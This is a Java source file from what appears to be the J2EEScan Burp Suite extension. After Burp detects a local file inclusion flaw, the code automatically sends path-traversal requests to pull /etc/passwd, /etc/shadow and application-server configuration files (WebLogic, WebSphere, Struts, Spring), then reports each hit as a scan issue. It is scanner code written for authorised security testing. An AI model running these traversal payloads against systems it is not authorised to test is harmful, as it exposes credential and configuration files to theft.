package burp.scan.lib;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.scan.passive.Confidence;
import burp.scan.passive.CustomScanIssue;

import java.io.PrintWriter;
import java.util.Arrays;
import java.util.List;

import static burp.scan.lib.HTTPMatcher.*;

/**
 * The aim of this class is to "exploit" a LFI vulnerability when detected by
 * Burp, to retrieve automatically common configuration files
 *
 */
public class J2EELFIRetriever {


    private static final String LFI_REMEDY = "Execute a code review activity to mitigate the LFI vulnerability<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.hpenterprisesecurity.com/vulncat/en/vulncat/java/file_disclosure_spring_webflow.html<br />"
            + "https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion<br />"
            + "http://cwe.mitre.org/data/definitions/22.html<br />"
            + "https://www.securecoding.cert.org/confluence/display/cplusplus/FIO02-CPP.+Canonicalize+path+names+originating+from+untrusted+sources<br />"
            + "https://www.securecoding.cert.org/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them";

    /**
     * Through a base LFI request, modify the given LFI payload to automatically
     * retrieve common configuration files
     *
     * @param cb
     * @param baseRequestResponse
     * @param request HTTP byte request
     * @param baseConfigFile usually the "/WEB-INF/web.xml" payload; this string
     * is inside the HTTP request and it will be mutated with other payloads to
     * accomplish the other LFI attempts
     */
    public static void download(IBurpExtenderCallbacks cb,
                                IHttpRequestResponse baseRequestResponse, byte[] request, String baseConfigFile) {

        IExtensionHelpers helpers = cb.getHelpers();
        String requestToString = helpers.bytesToString(request);

        PrintWriter stderr = new PrintWriter(cb.getStderr(), true);


        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);

        // Try to retrieve /etc/passwd file
        try {                   
            
            String passwdLFIRequest = requestToString.replace(baseConfigFile,
                    helpers.urlEncode("../../../../../../../../../../../../../../../etc/passwd"));


            IHttpRequestResponse passwdRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(passwdLFIRequest));
            byte[] passwdResponse = passwdRequestResponse.getResponse();

            if (isEtcPasswdFile(passwdResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        passwdRequestResponse,
                        "Local File Include - /etc/passwd Retrieved",
                        "J2EEScan was able to retrieve the <i>/etc/passwd</i> resource through the LFI vulnerability",
                        "Analyse the issue to understand if the vulnerability is caused by an infrastructure component or by an application issue.",
                        Risk.High,
                        Confidence.Firm
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        // Try to retrieve /etc/shadow file     
        try {
            String shadowLFIRequest = requestToString.replace(baseConfigFile,
                    helpers.urlEncode("../../../../../../../../../../../../../../../etc/shadow"));

            IHttpRequestResponse shadowRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(shadowLFIRequest));
            byte[] shadowResponse = shadowRequestResponse.getResponse();

            if (isEtcShadowFile(shadowResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        shadowRequestResponse,
                        "Local File Include - /etc/shadow Retrieved",
                        "J2EEScan was able tor retrieve the <i>/etc/shadow</i> resource "
                        + "through the LFI vulnerability. "
                        + "It seems that the remote web server/application server "
                        + "process is running with too much privileges.<br /><br />"
                        + "<b>References</b>:<br /><br />"
                        + "http://cwe.mitre.org/data/definitions/250.html<br />",
                        "Verify the remote process privileges",
                        Risk.High,
                        Confidence.Certain
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        // Try to retrieve /ibm-web-ext.xml file
        try {
            //         
            String ibmwebLFIRequest = requestToString.replace(baseConfigFile, "ibm-web-ext.xml");

            IHttpRequestResponse ibmwebRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(ibmwebLFIRequest));

            byte[] ibmwebResponse = ibmwebRequestResponse.getResponse();

            if (HTTPMatcher.isIBMWebExtFileWAS7(ibmwebResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        ibmwebRequestResponse,
                        "Local File Include - ibm-web-ext.xml Retrieved",
                        "J2EEScan was able tor retrieve the IBM Application Server ibm-web-ext.xml resource through the LFI vulnerability.",
                        LFI_REMEDY,
                        Risk.Low,
                        Confidence.Certain
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }
        
        
        // Try to retrieve /ibm-web-ext.xmi  file     
        try {
            //         
            String ibmwebLFIRequest = requestToString.replace(baseConfigFile, "ibm-web-ext.xmi");

            IHttpRequestResponse ibmwebRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(ibmwebLFIRequest));

            byte[] ibmwebResponse = ibmwebRequestResponse.getResponse();

            if (HTTPMatcher.isIBMWebExtFileWAS6(ibmwebResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        ibmwebRequestResponse,
                        "Local File Include - ibm-web-ext.xmi Retrieved",
                        "J2EEScan was able tor retrieve the IBM Application Server ibm-web-ext.xmi resource through the LFI vulnerability.",
                        LFI_REMEDY,
                        Risk.Low,
                        Confidence.Certain               
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        // Try to retrieve ibm-ws-bnd.xml file
        try {
            // http://www-01.ibm.com/support/knowledgecenter/SSAW57_8.5.5/com.ibm.websphere.wlp.nd.doc/ae/twlp_sec_ws_basicauth.html?cp=SSAW57_8.5.5%2F1-3-11-0-4-9-0-1 
            String ibmwebLFIRequest = requestToString.replace(baseConfigFile, "ibm-ws-bnd.xml");

            IHttpRequestResponse ibmwebRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(ibmwebLFIRequest));

            byte[] ibmwebResponse = ibmwebRequestResponse.getResponse();

            if (isIBMWSBinding(ibmwebResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        ibmwebRequestResponse,
                        "Local File Include - ibm-ws-bnd.xml Retrieved",
                        "J2EEScan was able tor retrieve the IBM Application Server ibm-ws-bnd.xml resource through the LFI vulnerability.",
                        LFI_REMEDY,
                        Risk.Low,
                        Confidence.Certain
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        
        // Try to retrieve weblogic.xml file   
        try {
            String weblogicLFIRequest = requestToString.replace(baseConfigFile, "weblogic.xml");

            IHttpRequestResponse weblogicRequestResponse = cb.makeHttpRequest(
                    baseRequestResponse.getHttpService(), helpers.stringToBytes(weblogicLFIRequest));
            byte[] weblogicResponse = weblogicRequestResponse.getResponse();

            if (HTTPMatcher.isWebLogicFile(weblogicResponse, helpers)) {
                cb.addScanIssue(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        requestInfo.getUrl(),
                        weblogicRequestResponse,
                        "Local File Include - weblogic.xml Retrieved",
                        "J2EEScan was able tor retrieve the weblogic.xml resource through the LFI vulnerability.",
                        LFI_REMEDY,
                        Risk.High,
                        Confidence.Certain
                ));
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        
        // Try to retrieve the struts configuration file
        try {
            // Possibile paths:
            // /WEB-INF/classes/struts.xml 
            // /WEB-INF/struts-config.xml 
            // /WEB-INF/struts.xml 
            final List<String> STRUTS_PATHS = Arrays.asList(
                    helpers.urlEncode("classes/struts.xml"),
                    "struts-config.xml",
                    "struts.xml"
            );

            for (String STRUT_PATH : STRUTS_PATHS) {

                String strutLFIRequest = requestToString.replace(baseConfigFile, STRUT_PATH);
                IHttpRequestResponse strutsRequestResponse = cb.makeHttpRequest(
                        baseRequestResponse.getHttpService(), helpers.stringToBytes(strutLFIRequest));

                byte[] strutsResponse = strutsRequestResponse.getResponse();

                if (isApacheStrutsConfigFile(strutsResponse, helpers)) {
                    cb.addScanIssue(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            requestInfo.getUrl(),
                            strutsRequestResponse,
                            "Local File Include - struts.xml Retrieved",
                            "J2EEScan was able tor retrieve the Apache Struts configuration file through the LFI vulnerability.",
                            LFI_REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }

            }

        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

        // Try to retrieve the Spring application context configuration file
        try {
            // Possibile paths:
            // /WEB-INF/application-context.xml
            // /WEB-INF/applicationContext.xml
            final List<String> APPLICATION_CONTEXTS_PATHS = Arrays.asList(
                    "applicationContext.xml",
                    helpers.urlEncode("classes/applicationContext.xml"),
                    "application-context.xml"
            );

            for (String APPLICATION_CONTEXT_PATH : APPLICATION_CONTEXTS_PATHS) {

                String strutLFIRequest = requestToString.replace(baseConfigFile, APPLICATION_CONTEXT_PATH);

                IHttpRequestResponse springRequestResponse = cb.makeHttpRequest(
                        baseRequestResponse.getHttpService(), helpers.stringToBytes(strutLFIRequest));

                byte[] springResponse = springRequestResponse.getResponse();

                if (isSpringContextConfigFile(springResponse, helpers)) {
                    cb.addScanIssue(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            requestInfo.getUrl(),
                            springRequestResponse,
                            "Local File Include - Spring Application Context Retrieved",
                            "J2EEScan was able tor retrieve the Spring Application Context"
                            + "  configuration file through the LFI vulnerability.",
                            LFI_REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace(stderr);
        }

    }

}
